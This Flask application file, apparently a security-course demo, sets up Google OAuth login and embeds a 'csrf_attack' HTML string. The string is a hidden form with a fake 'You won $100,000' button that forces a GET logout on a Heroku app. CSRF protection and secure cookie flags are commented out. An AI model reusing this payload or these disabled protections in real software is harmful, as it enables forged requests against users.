import functools
import json
import os
import flask
from authlib.client import OAuth2Session
import google.oauth2.credentials
import googleapiclient.discovery

import google_auth
import google_drive
import links

# from flask_wtf.csrf import CSRFProtect

# import secrets

app = flask.Flask(__name__)

# app.config['SESSION_COOKIE_SECURE'] = True
# app.config['SESSION_COOKIE_HTTPONLY'] = True
# app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.secret_key = os.environ.get('FN_FLASK_SECRET_KEY', default=False)

app.register_blueprint(google_auth.app)
app.register_blueprint(google_drive.app)
app.register_blueprint(links.app)

csrf_attack = '<form hidden id="hack" target="csrf-frame" action="https://laryn-links.herokuapp.com/logout" method="GET" autocomplete="off"> </form> <iframe hidden name="csrf-frame"></iframe> <h3>You won $100,000</h3> <button onClick="hack();" id="button">Click to claim</button> <br> <div id="warning"></div> <script> function hack() { document.getElementById("hack").submit(); document.getElementById("warning").innerHTML="check your login status!"; } </script>'

@app.route('/')
def index():
    if google_auth.is_logged_in():
        user_info = google_auth.get_user_info()
        # key = secrets.token_urlsafe(64)
        # google_auth.recv_key(flask.request.cookies.get('session'), key)
        # return '<div> You are currently logged in as ' + user_info['given_name'] + '</div><pre>' + json.dumps(user_info, indent=4) + '</pre>' + f'<button onclick="window.location.href=\'\\logout\\?key={key}\';"> Logout </button>' + csrf_attack
        return '<div> You are currently logged in as ' + user_info['given_name'] + '</div><pre>' + json.dumps(user_info, indent=4) + '</pre>' + f'<button onclick="window.location.href=\'\\logout\';"> Logout </button>' + csrf_attack
    return '<button onclick="window.location.href=\'\\login\';"> Login </button>'

# csrf = CSRFProtect()
# csrf.init_app(app)

if __name__ == '__main__':
    app.run(threaded=True, port=5000)
